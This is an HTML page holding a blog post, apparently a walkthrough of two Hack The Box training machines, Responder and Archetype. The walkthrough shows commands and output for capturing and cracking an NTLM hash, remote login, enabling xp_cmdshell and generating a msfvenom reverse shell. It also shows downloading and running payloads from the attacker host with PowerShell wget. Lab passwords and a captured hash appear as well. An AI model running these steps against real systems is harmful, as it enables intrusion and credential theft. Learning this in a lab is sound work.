@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Respondertarget IP 換過 Enumeration12345678910111213141516└─$ rustscan -a 10.129.80.176   --ulimit 5000...PORT     STATE SERVICE REASON80&#x2F;tcp   open  http    syn-ack ttl 1275985&#x2F;tcp open  wsman   syn-ac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Starting Point (Windows)">
+<meta property="og:url" content="http://example.com/2025/01/04/HTB-Starting-Point-Windows/index.html">
+<meta property="og:site_name" content="wang&#39;s blog">
+<meta property="og:description" content="Respondertarget IP 換過 Enumeration12345678910111213141516└─$ rustscan -a 10.129.80.176   --ulimit 5000...PORT     STATE SERVICE REASON80&#x2F;tcp   open  http    syn-ack ttl 1275985&#x2F;tcp open  wsman   syn-ac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJysO6S41e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1xZUK841l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy8_QFLE1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByhVShUEkg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rytx93UE1e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SydynnINkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyLBw5cVye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk5IK9cVkx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJGBYqcVye.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyK6ai9N1l.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r158Ko5E1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1Ri9sc4kg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJag12cVkl.png">
+<meta property="article:published_time" content="2025-01-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-02T14:00:16.052Z">
+<meta property="article:author" content="wang">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SJysO6S41e.png">
+    
+    
+    <!-- title -->
+    <title>HTB Starting Point (Windows)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/18/picoCTF-2025-WriteUp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/30/wang-s-No-Hack-No-CTF-2024-official-Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/04/HTB-Starting-Point-Windows/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&text=HTB Starting Point (Windows)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&is_video=false&description=HTB Starting Point (Windows)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Windows)&body=Check out this article: http://example.com/2025/01/04/HTB-Starting-Point-Windows/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&name=HTB Starting Point (Windows)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&t=HTB Starting Point (Windows)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder"><span class="toc-number">1.</span> <span class="toc-text">Responder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM"><span class="toc-number">1.2.</span> <span class="toc-text">WinRM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Archetype"><span class="toc-number">2.</span> <span class="toc-text">Archetype</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">2.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold"><span class="toc-number">2.2.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB Starting Point (Windows)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-03T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-01-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><p>target IP 換過</p>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ rustscan -a 10.129.80.176   --ulimit 5000</span><br><span class="line">...</span><br><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">80/tcp   open  http    syn-ack ttl 127</span><br><span class="line">5985/tcp open  wsman   syn-ack ttl 127 # WinRM</span><br><span class="line"></span><br><span class="line">└─$ nmap 10.129.80.176  -p 80,5985 -sC -sV</span><br><span class="line">...</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1</span><br><span class="line">5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<p>瀏覽器開 <code>10.129.80.176:80</code><br><img src="https://hackmd.io/_uploads/SJysO6S41e.png" alt="image"><br>猜因為是  Name-Based Virtual hosting，後端會檢查 HOST header</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &quot;10.129.80.176 unika.htb&quot; | sudo tee -a /etc/hosts</span><br><span class="line">```                                             </span><br><span class="line">![image](https://hackmd.io/_uploads/rk_LFTrVkg.png)</span><br><span class="line">### LFI</span><br><span class="line">![image](https://hackmd.io/_uploads/ryfCWyI4ke.png)</span><br><span class="line">改變語言</span><br><span class="line">![image](https://hackmd.io/_uploads/B16Xb1U4kl.png)</span><br><span class="line">![image](https://hackmd.io/_uploads/rJ8WfJIV1l.png)</span><br><span class="line">![image](https://hackmd.io/_uploads/H12gUb84Jg.png)</span><br><span class="line">### RFI、responder capture NTMLv2hash</span><br><span class="line">可LFI，嘗試用RFI觸發NTLM驗證</span><br><span class="line">用  responder 捕捉  NTLM hash</span><br></pre></td></tr></table></figure>
+<p>└─$ sudo responder -I tun0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">![image](https://hackmd.io/_uploads/H1uPL-IN1x.png)</span><br><span class="line">![image](https://hackmd.io/_uploads/SJswDZIEkl.png)</span><br><span class="line">```bash</span><br><span class="line">└─$ echo &quot;Administrator::RESPONDER:4a95d07b969fd046:A53ADF8373CE1A31E960396F36847991:0101000000000000001032844D4BDB01C3F930F5F8FEF00E00000000020008003300550057004A0001001E00570049004E002D005200430058005200380046003600360031005600410004003400570049004E002D00520043005800520038004600360036003100560041002E003300550057004A002E004C004F00430041004C00030014003300550057004A002E004C004F00430041004C00050014003300550057004A002E004C004F00430041004C0007000800001032844D4BDB0106000400020000000800300030000000000000000100000000200000CE56F35E8FA2A58E4B4D985DE92E914919906A167F49C57248EE7F00607763B90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360031000000000000000000&quot; &gt; hash.txt</span><br><span class="line">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">...</span><br><span class="line">badminton        (Administrator) </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ evil-winrm -i 10.129.134.106 -u Administrator -p badminton</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><br></pre></td></tr></table></figure>
+<p>經過尋找<br><img src="https://hackmd.io/_uploads/S1xZUK841l.png" alt="image"><br><img src="https://hackmd.io/_uploads/Sy8_QFLE1x.png" alt="image"></p>
+<h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><h3 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">└─$ rustscan -a 10.129.128.154 --<span class="built_in">ulimit</span> 5000</span><br><span class="line">PORT     STATE SERVICE      REASON</span><br><span class="line">135/tcp  open  msrpc        syn-ack ttl 127</span><br><span class="line">139/tcp  open  netbios-ssn  syn-ack ttl 127</span><br><span class="line">445/tcp  open  microsoft-ds syn-ack ttl 127</span><br><span class="line">1433/tcp open  ms-sql-s     syn-ack ttl 127</span><br><span class="line">5985/tcp open  wsman        syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">└─$ nmap 10.129.128.154 -p 135,139,445,1433,5985 -sC -sV</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.129.128.154:1433: </span><br><span class="line">|     Target_Name: ARCHETYPE</span><br><span class="line">|     NetBIOS_Domain_Name: ARCHETYPE</span><br><span class="line">|     NetBIOS_Computer_Name: ARCHETYPE</span><br><span class="line">|     DNS_Domain_Name: Archetype</span><br><span class="line">|     DNS_Computer_Name: Archetype</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.129.128.154:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-12-11T06:16:46</span><br><span class="line">|_Not valid after:  2054-12-11T06:16:46</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2024-12-11T06:28:15+00:00; +1s from scanner time.</span><br><span class="line">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)</span><br><span class="line">|   Computer name: Archetype</span><br><span class="line">|   NetBIOS computer name: ARCHETYPE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2024-12-10T22:27:59-08:00</span><br><span class="line">|_clock-skew: mean: 1h36m01s, deviation: 3h34m41s, median: 0s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-12-11T06:27:57</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/ByhVShUEkg.png" alt="image"><br><img src="https://hackmd.io/_uploads/rytx93UE1e.png" alt="image"><br>取得SQL server帳密<br><img src="https://hackmd.io/_uploads/SydynnINkx.png" alt="image"></p>
+<h3 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h3><p>check what is the role we have in the server</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (ARCHETYPE\sql_svc  dbo<span class="variable">@master</span>)<span class="operator">&gt;</span> <span class="keyword">SELECT</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="operator">-</span>   </span><br><span class="line"><span class="number">1</span> </span><br></pre></td></tr></table></figure>
+<p>確認xp_cmdshell是否啟用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (ARCHETYPE\sql_svc  dbo<span class="variable">@master</span>)<span class="operator">&gt;</span> <span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;net user&#x27;</span>;</span><br><span class="line">ERROR(ARCHETYPE): Line <span class="number">1</span>: <span class="keyword">SQL</span> Server blocked access <span class="keyword">to</span> <span class="keyword">procedure</span> <span class="string">&#x27;sys.xp_cmdshell&#x27;</span> <span class="keyword">of</span> component <span class="string">&#x27;xp_cmdshell&#x27;</span> because this component <span class="keyword">is</span> turned off <span class="keyword">as</span> part <span class="keyword">of</span> the security configuration <span class="keyword">for</span> this server. A <span class="keyword">system</span> administrator can enable the use <span class="keyword">of</span> <span class="string">&#x27;xp_cmdshell&#x27;</span> <span class="keyword">by</span> <span class="keyword">using</span> sp_configure. <span class="keyword">For</span> more information about enabling <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="keyword">search</span> <span class="keyword">for</span> <span class="string">&#x27;xp_cmdshell&#x27;</span> <span class="keyword">in</span> <span class="keyword">SQL</span> Server Books Online.</span><br></pre></td></tr></table></figure>
+<p>啟用xp_cmdshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">sp_configure; <span class="operator">-</span> Enabling the sp_configure <span class="keyword">as</span> stated <span class="keyword">in</span> the above error message</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p>製作reverse shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.52  LPORT=443 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>
+<p>沒有權限在當前目錄上傳檔案<br><img src="https://hackmd.io/_uploads/SyLBw5cVye.png" alt="image"><br>試試看sql_svc的家目錄</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (ARCHETYPE\sql_svc  dbo<span class="variable">@master</span>)<span class="operator">&gt;</span> xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.14.52:8000/reverse.exe -outfile reverse.exe&quot;</span><br><span class="line">output   </span><br><span class="line"><span class="comment">------   </span></span><br><span class="line"><span class="keyword">NULL</span>  </span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Hk5IK9cVkx.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span> (ARCHETYPE\sql_svc  dbo<span class="variable">@master</span>)<span class="operator">&gt;</span> xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;.\reverse.exe&quot;</span><br><span class="line">output   </span><br><span class="line"><span class="comment">------   </span></span><br><span class="line"><span class="keyword">NULL</span> </span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SJGBYqcVye.png" alt="image"><br>取得 user flag<br><img src="https://hackmd.io/_uploads/SyK6ai9N1l.png" alt="image"></p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>用winPEAS腳本枚舉</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\sql_svc\Downloads&gt;powershell -c wget http://10.10.14.52:8000/winPEASx64.exe -outfile winPEASx64.exe</span><br><span class="line">C:\Users\sql_svc\Downloads&gt;.\winPEASx64.exe</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/r158Ko5E1x.png" alt="image"><br><img src="https://hackmd.io/_uploads/H1Ri9sc4kg.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ psexec.py administrator@10.129.157.196</span><br><span class="line">Password:MEGACORP_4dm1n!!</span><br></pre></td></tr></table></figure>
+<p>取得 root flag<br><img src="https://hackmd.io/_uploads/rJag12cVkl.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tag/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder"><span class="toc-number">1.</span> <span class="toc-text">Responder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM"><span class="toc-number">1.2.</span> <span class="toc-text">WinRM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Archetype"><span class="toc-number">2.</span> <span class="toc-text">Archetype</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">2.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold"><span class="toc-number">2.2.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/04/HTB-Starting-Point-Windows/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&text=HTB Starting Point (Windows)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&is_video=false&description=HTB Starting Point (Windows)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Windows)&body=Check out this article: http://example.com/2025/01/04/HTB-Starting-Point-Windows/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/04/HTB-Starting-Point-Windows/&title=HTB Starting Point (Windows)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
